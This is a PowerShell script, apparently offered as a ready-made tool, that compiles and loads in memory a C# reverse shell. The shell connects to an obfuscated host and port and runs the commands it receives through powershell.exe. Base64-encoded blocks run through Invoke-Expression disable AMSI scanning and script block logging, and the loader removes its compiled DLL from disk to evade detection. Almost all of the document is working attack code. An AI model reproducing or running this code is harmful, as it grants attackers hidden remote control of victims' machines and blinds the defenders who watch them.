Write-Host "========================================" -ForegroundColor Cyan
Write-Host "PowerShell Reverse Shell - In-Memory DLL Loader" -ForegroundColor Yellow
Write-Host "Developpe par: Florent Vinai" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
$ipB = [Convert]::FromBase64String('MTkyLjE2OC4xLjEwMA=='); $hst = -join [char[]]$ipB;
$prt = [int](([Math]::Pow(2,2) + [Math]::Pow(2,3) + [Math]::Pow(2,4) + [Math]::Pow(2,6) + [Math]::Pow(2,8) + [Math]::Pow(2,12)));
$csCode = @"
using System;
using System.Net.Sockets;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;

[ComVisible(true)]
[Guid("A5B5C5D5-E5F5-4A5B-8C5D-5E5F5A5B5C5D")]
[ClassInterface(ClassInterfaceType.None)]
public class RShellDll : IObjectSafety {
    private static TcpClient client;
    private static NetworkStream stream;
    private static StreamReader reader;
    private static StreamWriter writer;
    private static Process psProcess;
    private static bool isRunning = false;
    
    static RShellDll() {
        if (!isRunning) {
            isRunning = true;
            Thread t = new Thread(() => Connect("$hst", $prt));
            t.IsBackground = true;
            t.Start();
        }
    }
    
    public RShellDll() {
        if (!isRunning) {
            isRunning = true;
            Thread t = new Thread(() => Connect("$hst", $prt));
            t.IsBackground = true;
            t.Start();
        }
    }
    
    private static void Connect(string host, int port) {
        while (true) {
            try {
                try {
                    client = new TcpClient();
                    client.Connect(host, port);
                    stream = client.GetStream();
                    reader = new StreamReader(stream, Encoding.UTF8);
                    writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true };
                    
                    writer.WriteLine("Connected. Type commands:");
                    
                    while (client.Connected) {
                        try {
                            if (stream.DataAvailable) {
                                string cmd = reader.ReadLine();
                                if (!string.IsNullOrEmpty(cmd)) {
                                    ExecuteCommand(cmd);
                                }
                            } else {
                                Thread.Sleep(new Random().Next(85, 145));
                            }
                        } catch {
                            break;
                        }
                    }
                } catch {
                    if (client != null) {
                        try { client.Close(); } catch { }
                        client = null;
                    }
                }
            } catch {
            } finally {
                Cleanup();
                Thread.Sleep(new Random().Next(2000, 5000));
            }
        }
    }
    
    private static void ExecuteCommand(string cmd) {
        try {
            ProcessStartInfo psi = new ProcessStartInfo {
                FileName = "powershell.exe",
                Arguments = "-Command " + cmd,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };
            psProcess = Process.Start(psi);
            string output = psProcess.StandardOutput.ReadToEnd();
            string error = psProcess.StandardError.ReadToEnd();
            psProcess.WaitForExit();
            
            if (string.IsNullOrEmpty(output) && string.IsNullOrEmpty(error)) {
                writer.WriteLine("PS> ");
            } else {
                writer.WriteLine(output + error);
            }
        } catch {
            try {
                writer.WriteLine("PS> ");
            } catch { }
        }
    }
    
    private static void Cleanup() {
        try {
            if (psProcess != null && !psProcess.HasExited) {
                psProcess.Kill();
            }
        } catch { }
        try {
            if (reader != null) reader.Close();
        } catch { }
        try {
            if (writer != null) writer.Close();
        } catch { }
        try {
            if (stream != null) stream.Close();
        } catch { }
        try {
            if (client != null) client.Close();
        } catch { }
    }
    
    public int GetInterfaceSafetyOptions(ref Guid riid, out int pdwSupportedOptions, out int pdwEnabledOptions) {
        pdwSupportedOptions = 1;
        pdwEnabledOptions = 1;
        return 0;
    }
    
    public int SetInterfaceSafetyOptions(ref Guid riid, int dwOptionSetMask, int dwEnabledOptions) {
        return 0;
    }
}

[ComImport]
[Guid("CB5BDC81-93C1-11CF-8F20-00805F2CD064")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface IObjectSafety {
    [PreserveSig]
    int GetInterfaceSafetyOptions(ref Guid riid, out int pdwSupportedOptions, out int pdwEnabledOptions);
    [PreserveSig]
    int SetInterfaceSafetyOptions(ref Guid riid, int dwOptionSetMask, int dwEnabledOptions);
}
"@

$b64Amsi = 'JCRYN0syID0gW1JlZl0uQXNzZW1ibHkuR2V0VHlwZXMoKTtmb3JlYWNoKCRZOW5QNCBpbiAkWDdrTTIpeyRaMXFSNiA9IC1qb2luKFtjaGFyXVsoNjUsMTA5LDExNSwxMDUsODUsMTE2LDEwNSwxMDgpXSk7aWYoJFk5blA0Lk5hbWUgLWxpa2UgIiokWjFxUjYqIil7JEEzc1Q4ID0gJFk5blA0O2JyZWFrfX07JEI1dVYwID0gJEEzc1Q4LkdldEZpZWxkcygtam9pbihbY2hhcl1bKDc4LDExMSwxMTAsODAsMTE3LDk4LDEwOCwxMDUsOTksNDQsODMsMTE2LDk3LDExNiwxMDUsOTkpXSkpO2ZvcmVhY2goJEM3d1gyIGluICRCNXVWMCl7JEQ5eVo0ID0gLWpvaW4oW2NoYXJdWyg2NywxMTEsMTEwLDExNiwxMDEsMTIwLDExNildKTtpZigkQzd3WDIuTmFtZSAtbGlrZSAiKiREOXlaNCoiKXskRTFhQjYgPSAkQzd3WDI7YnJlYWt9fTtpZigkRTFhQjYpeyRGM2NEOCA9ICRFMWFCNi5HZXRWYWx1ZSgkbnVsbCk7W0ludFB0cl0kRzVlRjAgPSAkRjNjRDg7W0ludDMyW11dJEg3Z0gyID0gQCgwKTtbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRIN2dIMiwgMCwgJEc1ZUYwLCAxKX0='
$b64Log = 'JEk5aUo0ID0gW3JlZl0uQXNzZW1ibHkuR2V0VHlwZSgtam9pbihbY2hhcl1bKDgzLDEyMSwxMTUsMTE2LDEwMSwxMDksNDYsNzcsOTcsMTEwLDk3LDEwMywxMDEsMTA5LDEwMSwxMTAsMTE2LDQ2LDY1LDExNywxMTYsMTExLDEwOSw5NywxMTYsMTA1LDExMSwxMTAsNDYsODUsMTE2LDEwNSwxMDgsMTE1KV0pKTskSjFrTDYgPSAkSTlpSjQuR2V0TWV0aG9kKC1qb2luKFtjaGFyXVsoNzEsMTAxLDExNiw3MCwxMDUsMTAxLDExOCwxMDBdKSksW3R5cGVbXV1AKFtzdHJpbmddLFtzdHJpbmddKSk7JEszbU44ID0gJEoxa0w2Lkludm9rZSgkbnVsbCxAKC1qb2luKFtjaGFyXVsoOTksOTcsOTksMTA0LDEwMSwxMDAsNzEsMTE0LDExMSwxMTcsMTEyLDgwLDExMSwxMDgsMTA1LDk5LDEyMSw4MywxMDEsMTE2LDExNiwxMDUsMTEwLDEwMywxMTVdKSksLWpvaW4oW2NoYXJdWyg3OCwxMTEsMTEwLDgwLDExNyw5OCwxMDgsMTA1LDk5LDQ0LDgzLDExNiw5NywxMTYsMTA1LDk5KV0pKSk7aWYoJEszbU44KXskTDVvUDAgPSAkSzNtTjguR2V0VmFsdWUoJG51bGwpOyRTQkwgPSAtam9pbihbY2hhcl1bKDgzLDk5LDExNCwxMDUsMTEyLDExNiw2NiwxMDgsMTExLDk5LDEwNyw3NiwxMTEsMTAzLDEwMywxMDUsMTEwLDEwMyldKTtpZigkTDVvUDBbJFNCTF0peyRMNm9QMFskU0JMXVstam9pbihbY2hhcl1bKDY5LDExMCw5Nyw5OCwxMDgsMTAxLDgzLDk5LDExNCwxMTYsNjYsMTA4LDExMSw5OSwxMDcsNzYsMTExLDEwMywxMDUsMTEwLDEwMyldKV0gPSAwOyRMMW9QMFskU0JMXVstam9pbihbY2hhcl1bKDY5LDExMCw5Nyw5OCwxMDgsMTAxLDgzLDk5LDExNCwxMTYsNjYsMTA4LDExMSw5OSwxMDcsNzMsMTEwLDExOCwxMTEsOTksOTcsMTE2LDEwNSwxMTEsMTEwLDc2LDExMSwxMDMsMTAzLDEwNSwxMTAsMTAzKV0pXSA9IDB9fTskTTdxUjIgPSBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU1NjcmlwdEJsb2NrXS5HZXRGaWVsZHMoLWpvaW4oW2NoYXJdWyg3OCwxMTEsMTEwLDgwLDExNyw5OCwxMDgsMTA1LDk5LDQ0LDgzLDExNiw5NywxMTYsMTA1LDk5KV0pKTtmb3JlYWNoKCROOHNUNCBpbiAkTTdxUjIpe2lmKCROOHNUNC5OYW1lIC1lcSAtam9pbihbY2hhcl1bKDc2LDExMSwxMDMsMTAzLDEwNSwxMTAsMTAzKV0pKXskTjhzVDQuU2V0VmFsdWUoJG51bGwsJGZhbHNlKX19'
try { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64Amsi)) | Invoke-Expression } catch {}
try { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64Log)) | Invoke-Expression } catch {}

$cscPath = $null
$paths = @(
    "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\Roslyn\csc.exe",
    "${env:ProgramFiles}\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\Roslyn\csc.exe",
    "$env:SystemRoot\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
    "$env:SystemRoot\Microsoft.NET\Framework\v4.0.30319\csc.exe"
)

foreach ($path in $paths) {
    if (Test-Path $path) {
        $cscPath = $path
        break
    }
}

$assemblyBytes = $null

if ($cscPath) {
    Write-Host "[*] Compilation en mémoire..." -ForegroundColor Yellow
    $csFile = [System.IO.Path]::GetTempFileName() + '.cs'
    [System.IO.File]::WriteAllText($csFile, $csCode, [System.Text.Encoding]::UTF8)
    
    $dllTemp = [System.IO.Path]::GetTempFileName() + '.dll'
    $cscArgs = @(
        "/target:library",
        "/out:$dllTemp",
        "/reference:System.dll",
        "/reference:System.Net.dll",
        "/reference:System.IO.dll",
        $csFile
    )
    
    $output = & $cscPath $cscArgs 2>&1
    
    if (Test-Path $dllTemp) {
        $assemblyBytes = [System.IO.File]::ReadAllBytes($dllTemp)
        Remove-Item $dllTemp -Force -ErrorAction SilentlyContinue
        Write-Host "[+] DLL compilée en mémoire" -ForegroundColor Green
    }
    
    Remove-Item $csFile -Force -ErrorAction SilentlyContinue
}

if (-not $assemblyBytes) {
    Write-Host "[*] Tentative avec Add-Type..." -ForegroundColor Yellow
    try {
        $typeName = "RShellDll" + [Guid]::NewGuid().ToString().Replace("-", "").Substring(0, 8)
        $modifiedCode = $csCode -replace "public class RShellDll", "public class $typeName"
        $modifiedCode = $modifiedCode -replace "RShellDll", $typeName
        
        Add-Type -TypeDefinition $modifiedCode -Language CSharp -ErrorAction Stop
        
        $assembly = [System.Reflection.Assembly]::GetAssembly([type]$typeName)
        $assemblyPath = $assembly.Location
        
        if ($assemblyPath -and (Test-Path $assemblyPath)) {
            $assemblyBytes = [System.IO.File]::ReadAllBytes($assemblyPath)
            Write-Host "[+] Assembly chargé depuis Add-Type" -ForegroundColor Green
        }
    } catch {
        Write-Host "[!] Add-Type a échoué: $_" -ForegroundColor Yellow
    }
}

if ($assemblyBytes) {
    Write-Host "[*] Chargement de l'assembly en mémoire..." -ForegroundColor Yellow
    try {
        $assembly = [System.Reflection.Assembly]::Load($assemblyBytes)
        $type = $assembly.GetType("RShellDll")
        $obj = [System.Activator]::CreateInstance($type)
        Write-Host "[+] Reverse shell lancé en mémoire (pas de fichier sur disque)" -ForegroundColor Green
        Write-Host "[*] Le reverse shell tourne en arrière-plan" -ForegroundColor Yellow
        Write-Host "[*] Aucun fichier .dll n'a été écrit sur le disque" -ForegroundColor Yellow
    } catch {
        Write-Host "[!] Erreur lors du chargement: $_" -ForegroundColor Red
    }
} else {
    Write-Host "[!] Impossible de compiler la DLL" -ForegroundColor Red
}
